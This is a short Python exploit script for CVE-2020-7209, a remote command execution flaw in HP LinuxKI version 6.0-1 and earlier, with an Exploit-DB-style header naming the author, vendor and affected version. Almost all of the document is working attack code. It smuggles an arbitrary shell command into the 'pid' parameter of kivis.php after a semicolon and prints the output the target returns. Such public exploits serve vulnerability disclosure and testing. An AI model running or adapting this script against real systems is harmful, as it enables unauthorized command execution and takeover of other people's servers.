Exploit Author: Cody Winkler
Vendor Homepage: https://www.hpe.com/us/en/home.html
Software Link: https://github.com/HewlettPackard/LinuxKI/releases/tag/v6.0-1
Version: <= v6.0-1
Tested on: LinuxKI Docker Image
CVE: CVE-2020-7209

#!/usr/bin/env python3

import requests
import argparse
import sys
import re

def parse_options():

	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
	parser = argparse.ArgumentParser(description=&#039;HP LinuxKI <= 6.0-1 RCE - CVE-2020-7209&#039;, formatter_class=formatter)
	parser.add_argument("-i", "--ip", dest=&#039;host&#039;, type=str, help="Target Hostname/IP", required=True)
	parser.add_argument("-p", "--port", dest=&#039;port&#039;, type=str, help="Target Port", required=True)
	parser.add_argument("-c", "--cmd", dest=&#039;cmd&#039;, type=str, help="Command to execute", required=True)
	args = parser.parse_args()
	return args

def main(args):

	host = args.host
	port = args.port
	cmd = args.cmd
	path = &#039;/linuxki/experimental/vis/kivis.php?type=kitrace&pid=15;echo BEGIN;%s;echo END;&#039; % cmd
	rce = requests.get(&#039;http://&#039; + host + &#039;:&#039; + port + path, verify=False)
	output = rce.text
	a, b = output.find(&#039;BEGIN&#039;), output.find(&#039;END&#039;)
	print(output[a+6:b])

if __name__ in "__main__":
	args = parse_options()
	main(args)

